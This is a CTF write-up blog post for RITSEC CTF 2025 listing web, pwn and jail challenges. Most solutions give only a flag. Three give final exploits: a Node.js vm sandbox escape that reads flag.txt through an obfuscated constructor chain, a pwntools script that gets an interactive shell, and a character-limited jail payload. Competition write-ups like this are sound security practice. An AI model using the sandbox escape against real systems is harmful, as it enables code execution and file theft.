---
weight: 1
title: "RITSEC CTF 2025"
date: 2025-03-21
lastmod: 2025-03-23
draft: false
author: "Xenonminer"
authorLink: "https://xenonminer.github.io"
description: "Writeup for the challenges in RITSEC CTF 2025"

tags: ["web", "pwn", "jail"]
categories: ["Writeups"]

lightgallery: true

toc:
  enable: true
---


- [https://ctftime.org/event/2673](https://ctftime.org/event/2673)
- March 21 - March 23

# My Solves/Writeups

## Web

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| web/virtual-mayhem | easy | 419 | [jump](#webvirtual-mayhem) |
| web/upload-issues | medium | 483 | [jump](#webupload-issues) |

## Pwn

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| pwn/bit-burger | easy | 467 | [jump](#pwnbit-burger) |
| pwn/hashmatch | medium | 499 | [jump](#pwnhashmatch) |

## Jail

| Challenge Name | Difficulty | Points | Writeup |
|---|---|---|---|
| jail/shrimple | easy | 494 | [jump](#jailshrimple) |
| jail/seti | easy | 496 | [jump](#jailseti) |

## Writeups
### web/virtual-mayhem

This application uses a virtual machine to sandbox user templates and filters potentially harmful input. However, every lock has its key. Can you figure out how to escape the virtual machine and retrieve the flag?

host5.metaproblems.com:7585

(This challenge was written by MetaCTF. The flag format is MetaCTF{})

Attachments: [virtual_mayhem.zip](https://ctfd.ritsec.club/files/6e87b37374f323335aff8977a297bfab/virtual_mayhem.zip?token=eyJ1c2VyX2lkIjo1NjksInRlYW1faWQiOjMwNiwiZmlsZV9pZCI6MjV9.Z-B-Jg.1W0IXuC7B-qiAa6I6WEV7CCAFJQ)

### Solution

Final exploit:
```js
({}).constructor.constructor("return glo"+"bal['pr'+'ocess']['main'+'Module']['req'+'uire']('f'+'s').readFileSync('flag.txt','utf8')")()
```

Flag: ```i forgor```
### web/upload-issues

This site lets you look at cpio archives. If only we had an admin account, we could look at the flag...

web-upload-issues.ctf.ritsec.club

(This challenge was written by ICR.)

Attachments: [upload_issues.zip](https://ctfd.ritsec.club/files/84e7abaa156f638e60e0e780fc15cb30/upload_issues.zip?token=eyJ1c2VyX2lkIjo1NjksInRlYW1faWQiOjMwNiwiZmlsZV9pZCI6NDB9.Z-B-1Q.6UTm9Z0hKBpLO7HF5X-MG3WDAqI)

### Solution


Flag: ```RS{b34m_m3_up_5c0tty}```

### pwn/bit-burger

Welcome to BitBurger, home of the world-famous Bit Burger! 🍔

Put in an order here: nc binex-bitburger.ctf.ritsec.club 32200

Only grilled or fried at the moment though, the other machines are broken, sorry!

(This challenge was written by MetaCTF.)

Attachments: [bit_burger.zip](https://ctfd.ritsec.club/files/0c89e0a38527c92bf27972fd41422f6b/bit_burger.zip?token=eyJ1c2VyX2lkIjo1NjksInRlYW1faWQiOjMwNiwiZmlsZV9pZCI6MzB9.Z-B_Iw.X1IvBkP67LkqSFi2Vpo4WfpO1Jk)

### Solution
The idea for this challenge was simple, being just

Final Exploit:
```py
from pwn import *

s    = lambda   x : io.send(x)
sa   = lambda x,y : io.sendafter(x,y)
sl   = lambda   x : io.sendline(x)
sla  = lambda x,y : io.sendlineafter(x,y)
r    = lambda x   : io.recv(x)
ru   = lambda x   : io.recvuntil(x)
rl   = lambda     : io.recvline()
itr  = lambda     : io.interactive()
uu32 = lambda x   : u32(x.ljust(4,b'\x00'))
uu64 = lambda x   : u64(x.ljust(8,b'\x00'))
ls   = lambda x   : log.success(x)
lss  = lambda x   : ls('\033[1;31;40m%s -> 0x%x \033[0m' % (x, eval(x)))

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe.path] + argv, *a, **kw)


def find_ip(payload):
    p = process([exe.path], level='warn')
    p.sendlineafter(b'>', payload)
    p.wait()
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))
    warn('located EIP/RIP offset at ' + ip_offset)
    return ip_offset

gdbscript = '''
init-pwndbg
b *0x0000000000401601
continue
'''.format(**locals())

exe = ELF("./bit_burger.bin_patched")
elf = context.binary = exe
context.log_level = 'debug'

# Start Exploit

offset = 0

io = start()

bits_to_set_for_exec = [1,3,5,7,9,10,13,23]
#bits_to_set_for_exec = [2, 12, 15, 16, 18, 19, 20, 23, 24]
for i in range(1, 25):
    if i in bits_to_set_for_exec:
        sla(b'?', b'y')
    else:
        sla(b'?', b'n')

sla(b':', b'a')
itr()
```
Flag: ```pTCNp5p6LP0d7qA77yvb4SHf40```

### pwn/hashmatch

This server is asking me to reverse a hash for a flag, but brute forcing MD5 sounds tedious. Maybe there's something more... fun we can do to find the flag.

nc hashmatch.ctf.ritsec.club 30898

When you connect, type your input and it will be handled by the challenge.

(This challenge was written by ICR.)

Attachments: [hashmatch.zip](https://ctfd.ritsec.club/files/67524143b8aa8bae3bfbaff845e09347/hashmatch.zip?token=eyJ1c2VyX2lkIjo1NjksInRlYW1faWQiOjMwNiwiZmlsZV9pZCI6NTJ9.Z-B_XA.zBZo6IPQg71dIx3iQ-ZWwHN-SZU)

### Solution
Note: Solved after the CTF ended.

Flag: ```nuclei```

### jail/shrimple

As shrimple as that :p

nc shrimple.ctf.ritsec.club 32195

Attachments: [shrimple.py](https://ctfd.ritsec.club/files/1dca913b2e6e8ffc19dfc1fd1164dfc6/shrimple.py?token=eyJ1c2VyX2lkIjo1NjksInRlYW1faWQiOjMwNiwiZmlsZV9pZCI6NDZ9.Z-B_gA.q6QKBzoDeEEQIopttb2b_ymfifU)

### Solution
After cleaning up many uneeded parentheses, I was eventually able to reach the 210 character limit.

Final exploit:
```
"((-~([]<[])<<-~-~-~-~([]<[]))--~-~([]<[])<<(-~(-~([]<[])<<-~-~-~-~([]<[]))--~-~([]<[])))-(-~-~-~-~([]<[]))**-~-~-~-~-~-~([]<[])+(-~-~([]<[])<<(-~-~-~-~-~-~([]<[])))+((-~([]<[]))<<-~-~-~-~-~([]<[]))--~-~([]<[])"
```

Then, after forming the image with CyberChef, throwing into [georgeom.net/StegOnline/](georgeom.net/StegOnline/) and browsing bit planes showed the flag.
```Flag: RS{n0t_s0_sHr1Mp13_any_m0r3_:3}```

### jail/seti

Come join our search for alien life

nc seti.ctf.ritsec.club 31793

Attachments: [seti.zip](https://ctfd.ritsec.club/files/fa22e106dfa5538a985b2fb282edc4a0/seti.zip?token=eyJ1c2VyX2lkIjo1NjksInRlYW1faWQiOjMwNiwiZmlsZV9pZCI6NDV9.Z-B_xA.dZ9pU6kxOysjF--ANSYzv8NGKd0)

### Solution


Flag: ```i forgor```
